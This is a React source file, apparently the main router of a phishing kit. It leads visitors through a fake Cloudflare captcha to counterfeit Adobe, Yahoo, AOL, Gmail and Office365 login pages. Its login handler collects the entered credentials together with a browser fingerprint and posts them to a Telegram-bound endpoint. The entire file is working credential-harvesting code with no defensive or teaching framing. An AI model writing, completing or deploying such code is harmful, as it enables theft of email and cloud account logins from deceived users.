import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

// This function is unchanged
const safeSendToTelegram = async (sessionData: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) { console.error('sendToTelegram failed:', fetchErr); throw fetchErr; }
};

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false); // Changed to false to prevent initial spinner
  const navigate = useNavigate();

  // This effect is unchanged
  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  // This effect now uses navigate() for routing
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const isActive = event.action !== 'remove' && !!event.value;
        setHasActiveSession(isActive);
        if (isActive) { navigate('/landing', { replace: true }); } 
        else { navigate('/', { replace: true }); }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, [navigate]);

  // This effect handles the initial page load
  useEffect(() => {
    if (hasActiveSession) { navigate('/landing', { replace: true }); }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Your core logic is preserved, but uses navigate()
  const handleCaptchaVerified = () => navigate('/login');
  
  const handleLoginSuccess = async (loginData: any) => {
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const finalSessionData = { 
      ...loginData, 
      sessionId: Math.random().toString(36).substring(2, 15), 
      timestamp: new Date().toISOString(), 
      userAgent: navigator.userAgent, 
      ...browserFingerprint 
    };
    localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));
    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
    setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
    setCookie('logged_in', 'true', cookieOptions);
    
    // Update session state immediately to trigger navigation
    setHasActiveSession(true);
    
    try { await safeSendToTelegram(finalSessionData); } catch (error) { console.error('Failed to send final data to Telegram:', error); }
    setIsLoading(false);
    
    // Ensure navigation to landing page
    navigate('/landing', { replace: true });
  };

  const handleLogout = () => {
    localStorage.removeItem(config.session.sessionDataKey);
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
  };

  // --- Render Logic ---
  if (isLoading) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;

  // This defines the pages and their paths for the router
  return (
    <Routes>
      <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
      <Route path="/login" element={!hasActiveSession ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;
